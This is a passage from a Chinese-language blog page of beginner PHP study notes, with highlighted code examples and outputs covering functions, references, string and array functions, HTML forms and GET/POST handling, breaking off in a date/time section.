if($a!==$b)//true</span>    <span class="token keyword">echo</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token keyword">else</span>    <span class="token keyword">echo</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>所有类型的变量都可以参与逻辑运算</strong></p><p>对于空字符串和null，为false，其余为true</p><p>对于数值0，为false，其余为true</p><h3 id="函数定义与调用"><a href="#函数定义与调用" class="headerlink" title="函数定义与调用"></a>函数定义与调用</h3><p><strong>默认参数(可选参数)</strong></p><p>默认参数要放在非默认的右边，不然有可能出错</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token comment">//自定义一个函数person，用于打印一个人的属性</span><span class="token keyword">function</span> <span class="token function">person</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token operator">=</span><span class="token double-quoted-string string">"张三"</span><span class="token punctuation">,</span> <span class="token variable">$age</span><span class="token operator">=</span><span class="token number">20</span><span class="token punctuation">,</span> <span class="token variable">$sex</span><span class="token operator">=</span><span class="token double-quoted-string string">"男"</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token double-quoted-string string">"姓名：<span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token variable">$name</span><span class="token punctuation">&#125;</span></span>, 年龄：<span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token variable">$age</span><span class="token punctuation">&#125;</span></span>, 性别：<span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token variable">$sex</span><span class="token punctuation">&#125;</span></span> &lt;br>"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token function">person</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>               <span class="token comment">//全部使用默认参数</span><span class="token function">person</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"李四"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment">//第一个默认参数被覆盖，后面两个参数为默认</span><span class="token function">person</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"李四"</span><span class="token punctuation">,</span><span class="token number">22</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token comment">//前两个默认参数被覆盖，后面一个参数为默认</span><span class="token function">person</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"李四"</span><span class="token punctuation">,</span><span class="token number">22</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"女"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">//三个默认参数都被覆盖</span><span class="token delimiter important">?></span></span>    输出姓名：张三, 年龄：20, 性别：男姓名：李四, 年龄：20, 性别：男姓名：李四, 年龄：22, 性别：男姓名：李四, 年龄：22, 性别：女<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>传值/传引用</strong></p><p>有点类似C的指针？</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">function</span> <span class="token function">value</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token comment">//传值方式</span>    <span class="token variable">$a</span><span class="token operator">+</span><span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token variable">$a</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function">quote</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token comment">//传引用方式</span>    <span class="token variable">$a</span><span class="token operator">+</span><span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token variable">$a</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token function">value</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$a</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token single-quoted-string string">'&lt;br>'</span><span class="token punctuation">;</span><span class="token function">quote</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$a</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span>输出2122<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>变量函数（58）了解</strong></p><p>有点类似C的函数指针？</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">function</span> <span class="token function">value</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token number">233</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function">quote</span><span class="token punctuation">(</span><span class="token variable">$n</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$n</span><span class="token operator">+</span><span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token variable">$n</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function">go</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token operator">=</span><span class="token double-quoted-string string">"YLN"</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token variable">$name</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"value"</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token single-quoted-string string">'&lt;br>'</span><span class="token punctuation">;</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"quote"</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token single-quoted-string string">'&lt;br>'</span><span class="token punctuation">;</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"go"</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"xiao"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span>    输出2333xiao    <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="流程控制"><a href="#流程控制" class="headerlink" title="流程控制"></a>流程控制</h3><p><strong>注意foreach语法</strong></p><p>下面有写</p><p>注意rand函数（66）</p><p>与C不同，获得的是随机<strong>整数</strong></p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$a</span><span class="token operator">=</span><span class="token function">rand</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$a</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span>    输出1-3间的整数    1/2/3<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="字符串操作"><a href="#字符串操作" class="headerlink" title="字符串操作"></a>字符串操作</h3><p>trim/ltrim/rtrim</p><p>trim() - 移除字符串两侧的空白字符或其他预定义字符。</p><p><img src="/2021/04/19/PHP/image-20210524165620442.png" alt="image-20210524165620442" loading="lazy"></p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$str</span> <span class="token operator">=</span> <span class="token double-quoted-string string">" Hello World! "</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$str</span> <span class="token punctuation">.</span> <span class="token double-quoted-string string">"&lt;br>"</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">trim</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">,</span><span class="token double-quoted-string string">" HELD! "</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token double-quoted-string string">"&lt;br>"</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">trim</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">,</span><span class="token double-quoted-string string">" llold! "</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token double-quoted-string string">"&lt;br>"</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">trim</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span>输出Hello World!ello WorldHello WorHello World!<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>和上面的一样的</p><p>ltrim() - 移除字符串左侧的空白字符或其他预定义字符。</p><p>rtrim() - 移除字符串右侧的空白字符或其他预定义字符。</p><p>转义还原函数（85）</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">addslashes()stripslashes()<span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$str</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"PHP,'Hello World!'"</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$str</span><span class="token punctuation">.</span><span class="token double-quoted-string string">"&lt;br>"</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">addslashes</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token double-quoted-string string">"&lt;br>"</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">stripslashes</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span>输出PHP,'Hello World!'PHP,\'Hello World!\'PHP,'Hello World!'<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>长度strlen</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">echo</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"你好,PHP"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span>输出10（6+4）utf-8编码下每个中文字符所占字节为3中文字符串的处理可以使用 mb_strlen() 函数<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>截取substr</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$str</span><span class="token operator">=</span><span class="token double-quoted-string string">"hello,this is yln956.github.io"</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token double-quoted-string string">"&lt;br>"</span><span class="token punctuation">;</span><span class="token comment">//0开始截取</span><span class="token keyword">echo</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token double-quoted-string string">"&lt;br>"</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token double-quoted-string string">"&lt;br>"</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token double-quoted-string string">"&lt;br>"</span><span class="token punctuation">;</span><span class="token comment">//倒数第四个开始截取两个</span><span class="token keyword">echo</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//从2开始截取到倒数第五</span><span class="token delimiter important">?></span></span>输出hello,this is yln956.github.io,this is yln956.github.ioo,thisb.llo,this is yln956.gith<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>查找strstr</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">strstr() 函数搜索字符串在另一字符串中是否存在，如果是，返回该字符串及剩余部分，否则返回 FALSE。该函数是区分大小写的。如需进行不区分大小写的搜索，请使用 stristr() 函数。<span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">echo</span> <span class="token function">strstr</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"Hello world!"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"wor"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// 输出 world!</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>替换str_replace</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">str_replace() 函数替换字符串中的一些字符（区分大小写）。该函数必须遵循下列规则：如果搜索的字符串是一个数组，那么它将返回一个数组。如果搜索的字符串是一个数组，那么它将对数组中的每个元素进行查找和替换。如果同时需要对某个数组进行查找和替换，并且需要执行替换的元素少于查找到的元素的数量，那么多余的元素将用空字符串进行替换。如果是对一个数组进行查找，但只对一个字符串进行替换，那么替代字符串将对所有查找到的值起作用。注释：该函数是区分大小写的。请使用 str_ireplace() 函数执行不区分大小写的搜索。<span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">echo</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"World"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"Peter"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"Hello World!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span>输出Hello Peter!<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>分割/合成（98）</strong></p><p>explode() 函数</p><p>把字符串打散为数组：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$str</span><span class="token operator">=</span><span class="token single-quoted-string string">'yln956.github.io'</span><span class="token punctuation">;</span><span class="token function">print_r</span><span class="token punctuation">(</span><span class="token function">explode</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'.'</span><span class="token punctuation">,</span><span class="token variable">$str</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token function">explode</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'.'</span><span class="token punctuation">,</span><span class="token variable">$str</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token function">explode</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'.'</span><span class="token punctuation">,</span><span class="token variable">$str</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token function">explode</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'.'</span><span class="token punctuation">,</span><span class="token variable">$str</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span>输出Array ( [0] => yln956.github.io )array (size=1)  0 => string 'yln956.github.io' (length=16)array (size=2)  0 => string 'yln956' (length=6)  1 => string 'github.io' (length=9)array (size=2)  0 => string 'yln956' (length=6)  1 => string 'github' (length=6)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>implode() 函数</p><p>把数组元素组合为一个字符串：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$str</span><span class="token operator">=</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'yln956'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'github'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'io'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">implode</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"."</span><span class="token punctuation">,</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token double-quoted-string string">"&lt;br>"</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">implode</span><span class="token punctuation">(</span><span class="token double-quoted-string string">" "</span><span class="token punctuation">,</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token double-quoted-string string">"&lt;br>"</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">implode</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"+"</span><span class="token punctuation">,</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token double-quoted-string string">"&lt;br>"</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">implode</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"-"</span><span class="token punctuation">,</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span>输出yln956.github.ioyln956 github ioyln956+github+ioyln956-github-io<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="数组"><a href="#数组" class="headerlink" title="数组"></a>数组</h3><p>数组类型可以任意</p><p>数组基本操作</p><p><strong>长度</strong></p><pre class="line-numbers language-php" data-language="php"><code class="language-php">获取数组的长度 - count() 函数count() 函数用于返回数组的长度（元素的数量）：<span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$cars</span><span class="token operator">=</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"Volvo"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"BMW"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"Toyota"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">count</span><span class="token punctuation">(</span><span class="token variable">$cars</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span>输出3<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>foreach</strong></p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$age</span><span class="token operator">=</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"Peter"</span><span class="token operator">=</span><span class="token operator">></span><span class="token double-quoted-string string">"35"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"Ben"</span><span class="token operator">=</span><span class="token operator">></span><span class="token double-quoted-string string">"37"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"Joe"</span><span class="token operator">=</span><span class="token operator">></span><span class="token double-quoted-string string">"43"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$age</span> <span class="token keyword">as</span> <span class="token variable">$x</span><span class="token operator">=</span><span class="token operator">></span><span class="token variable">$x_value</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">echo</span> <span class="token double-quoted-string string">"Key="</span> <span class="token punctuation">.</span> <span class="token variable">$x</span> <span class="token punctuation">.</span> <span class="token double-quoted-string string">", Value="</span> <span class="token punctuation">.</span> <span class="token variable">$x_value</span><span class="token punctuation">;</span>  <span class="token keyword">echo</span> <span class="token double-quoted-string string">"&lt;br>"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>运行结果</p><p><img src="/2021/04/19/PHP/image-20210523192453113.png" alt="image-20210523192453113" loading="lazy"></p><p>把数组当堆栈array_push($a,”3”,”4”)</p><p>删除重复等操作array_unique($a)</p><p><strong>下表和键值的区别，下标可以不连续</strong></p><h1 id="与WEB交互"><a href="#与WEB交互" class="headerlink" title="与WEB交互"></a>与WEB交互</h1><h3 id="表单的使用"><a href="#表单的使用" class="headerlink" title="表单的使用"></a>表单的使用</h3><p><strong>from基本参数</strong></p><p>基本表单元素</p><p><strong>表单中使用数组/多选</strong></p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token operator">&lt;</span>form action<span class="token operator">=</span><span class="token double-quoted-string string">"welcome.php"</span> method<span class="token operator">=</span><span class="token double-quoted-string string">"post"</span><span class="token operator">></span>    <span class="token operator">&lt;</span>div<span class="token operator">></span>头像<span class="token punctuation">:</span> <span class="token operator">&lt;</span>input type<span class="token operator">=</span><span class="token double-quoted-string string">"file"</span> name<span class="token operator">=</span><span class="token double-quoted-string string">"file"</span> id<span class="token operator">=</span><span class="token double-quoted-string string">"file"</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>div<span class="token operator">></span>    <span class="token operator">&lt;</span>div<span class="token operator">></span>生日<span class="token punctuation">:</span> <span class="token operator">&lt;</span>input type<span class="token operator">=</span><span class="token double-quoted-string string">"date"</span> name<span class="token operator">=</span><span class="token double-quoted-string string">"birthday"</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>div<span class="token operator">></span>    <span class="token operator">&lt;</span>div<span class="token operator">></span>名字<span class="token punctuation">:</span> <span class="token operator">&lt;</span>input type<span class="token operator">=</span><span class="token double-quoted-string string">"text"</span> name<span class="token operator">=</span><span class="token double-quoted-string string">"fname"</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>div<span class="token operator">></span>    <span class="token operator">&lt;</span>div<span class="token operator">></span>密码<span class="token punctuation">:</span> <span class="token operator">&lt;</span>input type<span class="token operator">=</span><span class="token double-quoted-string string">"password"</span>name<span class="token operator">=</span><span class="token double-quoted-string string">"password"</span> placeholder<span class="token operator">=</span><span class="token double-quoted-string string">"请输入密码"</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>div<span class="token operator">></span>    <span class="token operator">&lt;</span>div<span class="token operator">></span>年龄<span class="token punctuation">:</span> <span class="token operator">&lt;</span>input type<span class="token operator">=</span><span class="token double-quoted-string string">"text"</span> name<span class="token operator">=</span><span class="token double-quoted-string string">"age"</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>div<span class="token operator">></span>    <span class="token operator">&lt;</span>select multiple<span class="token operator">=</span><span class="token double-quoted-string string">"multiple"</span> name<span class="token operator">=</span><span class="token double-quoted-string string">"q[]"</span><span class="token operator">></span><span class="token comment">//多选</span>        <span class="token operator">&lt;</span>option value<span class="token operator">=</span><span class="token double-quoted-string string">""</span><span class="token operator">></span>选择一个站点<span class="token punctuation">:</span><span class="token operator">&lt;</span><span class="token operator">/</span>option<span class="token operator">></span>        <span class="token operator">&lt;</span>option value<span class="token operator">=</span><span class="token double-quoted-string string">"RUNOOB"</span><span class="token operator">></span>Runoob<span class="token operator">&lt;</span><span class="token operator">/</span>option<span class="token operator">></span>        <span class="token operator">&lt;</span>option value<span class="token operator">=</span><span class="token double-quoted-string string">"GOOGLE"</span><span class="token operator">></span>Google<span class="token operator">&lt;</span><span class="token operator">/</span>option<span class="token operator">></span>        <span class="token operator">&lt;</span>option value<span class="token operator">=</span><span class="token double-quoted-string string">"TAOBAO"</span><span class="token operator">></span>Taobao<span class="token operator">&lt;</span><span class="token operator">/</span>option<span class="token operator">></span>    <span class="token operator">&lt;</span><span class="token operator">/</span>select<span class="token operator">></span><span class="token operator">&lt;</span>br<span class="token operator">></span>    <span class="token operator">&lt;</span>select name<span class="token operator">=</span><span class="token double-quoted-string string">"q"</span><span class="token operator">></span><span class="token comment">//单选</span>        <span class="token operator">&lt;</span>option value<span class="token operator">=</span><span class="token double-quoted-string string">""</span><span class="token operator">></span>选择一个站点<span class="token punctuation">:</span><span class="token operator">&lt;</span><span class="token operator">/</span>option<span class="token operator">></span>        <span class="token operator">&lt;</span>option value<span class="token operator">=</span><span class="token double-quoted-string string">"RUNOOB"</span><span class="token operator">></span>Runoob<span class="token operator">&lt;</span><span class="token operator">/</span>option<span class="token operator">></span>        <span class="token operator">&lt;</span>option value<span class="token operator">=</span><span class="token double-quoted-string string">"GOOGLE"</span><span class="token operator">></span>Google<span class="token operator">&lt;</span><span class="token operator">/</span>option<span class="token operator">></span>        <span class="token operator">&lt;</span>option value<span class="token operator">=</span><span class="token double-quoted-string string">"TAOBAO"</span><span class="token operator">></span>Taobao<span class="token operator">&lt;</span><span class="token operator">/</span>option<span class="token operator">></span>    <span class="token operator">&lt;</span><span class="token operator">/</span>select<span class="token operator">></span>    <span class="token operator">&lt;</span>div<span class="token operator">></span><span class="token operator">&lt;</span>input type<span class="token operator">=</span><span class="token double-quoted-string string">"submit"</span> value<span class="token operator">=</span><span class="token double-quoted-string string">"提交"</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>div<span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>form<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="POST和GET"><a href="#POST和GET" class="headerlink" title="POST和GET"></a>POST和GET</h3><p>POST是不可见的</p><p>GET在URL中，是可见的</p><h3 id="如何在服务器得到WEB传递的参数"><a href="#如何在服务器得到WEB传递的参数" class="headerlink" title="如何在服务器得到WEB传递的参数"></a>如何在服务器得到WEB传递的参数</h3><p>使用超级全局变量</p><ul><li>$_REQUEST</li><li>$_POST</li><li>$_GET</li><li>$_FILES</li><li>$_COOKIE</li><li>$_SESSION</li><li>等等</li></ul><p>$_GET[‘username’]</p><p>$_POST[‘username’]</p><h3 id="URL传递参数与POST的区别"><a href="#URL传递参数与POST的区别" class="headerlink" title="URL传递参数与POST的区别"></a>URL传递参数与POST的区别</h3><p>get大小有限制</p><p>post一般没限制</p><h3 id="文件上传-file含义了解"><a href="#文件上传-file含义了解" class="headerlink" title="文件上传(file含义了解)"></a>文件上传(file含义了解)</h3><h3 id="URL编码-解码"><a href="#URL编码-解码" class="headerlink" title="URL编码/解码"></a>URL编码/解码</h3><p>urlencode();编码<br>urldecode();解码</p><h1 id="与JS集成（了解）"><a href="#与JS集成（了解）" class="headerlink" title="与JS集成（了解）"></a>与JS集成（了解）</h1><h3 id="哪里运行"><a href="#哪里运行" class="headerlink" title="哪里运行"></a>哪里运行</h3><p>一般运行在浏览器中</p><h3 id="什么作用"><a href="#什么作用" class="headerlink" title="什么作用"></a>什么作用</h3><p>提供界面交互</p><h3 id="嵌入与外部引用"><a href="#嵌入与外部引用" class="headerlink" title="嵌入与外部引用"></a>嵌入与外部引用</h3><h1 id="日期和时间"><a href="#日期和时间" class="headerlink" title="日期和时间"></a>日期和时间</h1><h3 id="时区设置"><a href="#时区设置" class="headerlink" title="时区设置"></a>时区设置</h3><h3 id="timepestamp"><a href="#timepestamp" class="headerlink" title="timepestamp"></a>timepestamp</h3><h3 id="时间类型与时间函数"><a href="#时间类型与时间函数" class="headerlink" title="时间类型与时间函数"></a>时间类型与时间函数</h3><p><strong>time函数，返回时间戳</strong></p><p><strong>date函数，根据时间戳返回时间</strong></p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$t</span><span class="token operator">=</span><span class="token function">time</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token 